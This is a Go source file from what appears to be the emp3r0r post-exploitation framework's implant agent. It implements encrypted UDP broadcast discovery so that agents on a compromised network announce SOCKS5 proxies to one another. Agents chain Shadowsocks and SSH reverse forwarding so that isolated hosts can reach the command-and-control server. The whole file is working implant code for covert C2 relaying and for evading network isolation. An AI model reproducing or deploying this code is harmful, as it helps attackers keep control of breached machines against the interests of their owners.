package agent

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/url"
	"strconv"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ReverseConns record ssh reverse proxy sessions
var ReverseConns = make(map[string]context.CancelFunc)

// BroadcastServer listen on a UDP port for broadcasts
// wait for some other agents to announce their internet proxy
func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string) (err error) {
	var passProxyCnt int // one time only

	defer cancel()
	bindaddr := ":" + port
	if port == "" {
		bindaddr = ":" + RuntimeConfig.BroadcastPort
	}
	pc, err := net.ListenPacket("udp4", bindaddr)
	if err != nil {
		return
	}
	defer pc.Close()
	log.Println("BroadcastServer started")

	buf := make([]byte, 1024)

	// reverseProxy listener
	// ssh reverse proxy
	go func() {
		err = tun.SSHRemoteFwdServer(RuntimeConfig.ReverseProxyPort,
			RuntimeConfig.Password,
			RuntimeConfig.SSHHostKey)
		if err != nil {
			log.Printf("SSHProxyServer: %v", err)
		}
	}()

	// monitor until it works
	go func() {
		// does the proxy work?
		rproxy := fmt.Sprintf("socks5://%s:%s@127.0.0.1:%s",
			RuntimeConfig.ShadowsocksLocalSocksPort, // user name of socks5 proxy
			RuntimeConfig.Password,                  // password of socks5 proxy

			// To make this work, we forward the socks5 proxy from another agent to us
			RuntimeConfig.Emp3r0rProxyServerPort) // port of socks5 proxy

		// wait for the proxy to work
		for {
			if RuntimeConfig.C2TransportProxy != "" {
				if tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress) {
					log.Printf("BroadcastServer: proxy '%s' is already working", RuntimeConfig.C2TransportProxy)
					continue
				}
			}
			if tun.IsProxyOK(rproxy, emp3r0r_data.CCAddress) {
				break
			}
			time.Sleep(time.Second)
		}
		RuntimeConfig.C2TransportProxy = rproxy
		log.Printf("[+] Reverse proxy configured to %s", rproxy)

		// pass the proxy to others
		if RuntimeConfig.C2TransportProxy == rproxy {
			go passProxy(ctx, cancel, &passProxyCnt)
		}
	}()

	// keep listening for broadcasts
	for ctx.Err() == nil {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil || n == 0 {
			log.Printf("BroadcastServer has read nothing: %v", err)
			continue
		}

		// decrypt broadcast message
		decBytes, err := tun.AES_GCM_Decrypt(emp3r0r_data.AESKey, buf[:n])
		if err != nil {
			log.Printf("BroadcastServer: %v", err)
		}
		decMsg := string(decBytes)
		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)
		if RuntimeConfig.C2TransportProxy != "" &&
			tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress) {
			log.Printf("BroadcastServer: proxy %s already set and working fine\n", RuntimeConfig.C2TransportProxy)
			continue
		}

		// parse proxy message
		// the broadcast message should be in the format of "socks5://user:pass@host:port"
		// we only need the host part as SS server address
		parsed_url, err := url.Parse(decMsg)
		if err != nil {
			log.Printf("BroadcastServer parse proxy URL: %v", err)
			continue
		}
		proxy_host := parsed_url.Hostname()

		// start a Shadowsocks local socks5 proxy using the server address in the broadcast message
		proxy_url := fmt.Sprintf("socks5://127.0.0.1:%s", RuntimeConfig.ShadowsocksLocalSocksPort)

		// test proxy
		is_proxy_ok := tun.IsProxyOK(proxy_url, emp3r0r_data.CCAddress)

		// if the proxy is not working
		// restart Shadowsocks local socks5 proxy
		if !is_proxy_ok {
			go ShadowsocksLocalSocks(proxy_host, RuntimeConfig.ShadowsocksLocalSocksPort)
		}

		// test proxy again
		is_proxy_ok = tun.IsProxyOK(proxy_url, emp3r0r_data.CCAddress)

		if is_proxy_ok {
			RuntimeConfig.C2TransportProxy = proxy_url
			log.Printf("BroadcastServer: %s set as RuntimeConfig.AgentProxy\n", RuntimeConfig.C2TransportProxy)

			// pass the proxy to others
			go passProxy(ctx, cancel, &passProxyCnt)

		} else {
			log.Printf("Oh crap! %s doen't work, we have to wait for a reverse proxy", proxy_url)
		}
	}
	return
}

// passProxy let other agents on our network use our RuntimeConfig.AgentProxy
// FIXME proxy URL parsing is not working due to username/password
func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
	// one time only
	*count++
	if *count > 1 {
		log.Printf("passProxy count %d, aborting", *count)
		return
	}

	proxyAddr := RuntimeConfig.C2TransportProxy
	parsed_url, err := url.Parse(proxyAddr)
	if err != nil {
		log.Printf("TCPFwd: invalid proxy addr: %s", proxyAddr)
		return
	}
	go func() {
		if parsed_url.Hostname() == "127.0.0.1" {
			log.Printf("RuntimeConfig.AgentProxy is %s, we are already serving the proxy, let's start broadcasting right away", proxyAddr)
			return
		}
		log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
		err := tun.TCPFwd(parsed_url.Host, RuntimeConfig.Emp3r0rProxyServerPort, ctx, cancel)
		if err != nil {
			log.Print("TCPFwd: ", err)
		}
	}()
	go StartBroadcast(false, ctx, cancel)
}

// BroadcastMsg send a broadcast message on a network
func BroadcastMsg(msg, dst string) (err error) {
	srcport := strconv.Itoa(util.RandInt(8000, 60000))
	pc, err := net.ListenPacket("udp4", ":"+srcport)
	if err != nil {
		return
	}
	defer pc.Close()

	// send to specified addr by default
	addr, err := net.ResolveUDPAddr("udp4", dst)
	if err != nil {
		return
	}

	// encrypt message
	encMsg, err := tun.AES_GCM_Encrypt(emp3r0r_data.AESKey, []byte(msg))
	if err != nil {
		return fmt.Errorf("failed to encrypt %s", msg)
	}

	_, err = pc.WriteTo([]byte(encMsg), addr)
	log.Printf("BroadcastMsg: sent %x (%s) to %s", encMsg, msg, dst)
	return
}

func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
	// disable broadcasting when interval is 0
	if RuntimeConfig.BroadcastIntervalMax == 0 {
		log.Println("Broadcasting is turned off, aborting")
		return
	}

	if start_socks5 {
		// start a socks5 proxy
		err := Socks5Proxy("on", "0.0.0.0:"+RuntimeConfig.Emp3r0rProxyServerPort)
		if err != nil {
			log.Printf("Socks5Proxy on: %v", err)
			return
		}
		defer func() {
			err := Socks5Proxy("off", "0.0.0.0:"+RuntimeConfig.Emp3r0rProxyServerPort)
			if err != nil {
				log.Printf("Socks5Proxy off: %v", err)
			}
		}()
	}

	defer func() {
		log.Print("Broadcasting stopped")
		cancel()
	}()
	for ctx.Err() == nil {
		log.Print("Broadcasting our proxy...")
		time.Sleep(time.Duration(util.RandInt(RuntimeConfig.BroadcastIntervalMin, RuntimeConfig.BroadcastIntervalMax)) * time.Second)
		ips := tun.IPaddr()
		for _, netip := range ips {
			proxyMsg := fmt.Sprintf("socks5://%s:%s@%s:%s",
				RuntimeConfig.ShadowsocksLocalSocksPort,
				RuntimeConfig.Password,
				netip.IP.String(), RuntimeConfig.Emp3r0rProxyServerPort)
			broadcastAddr := tun.IPbroadcastAddr(netip)
			if broadcastAddr == "" {
				continue
			}
			err := BroadcastMsg(proxyMsg, broadcastAddr+":"+RuntimeConfig.BroadcastPort)
			if err != nil {
				log.Printf("BroadcastMsg failed: %v", err)
			}
		}
	}
}
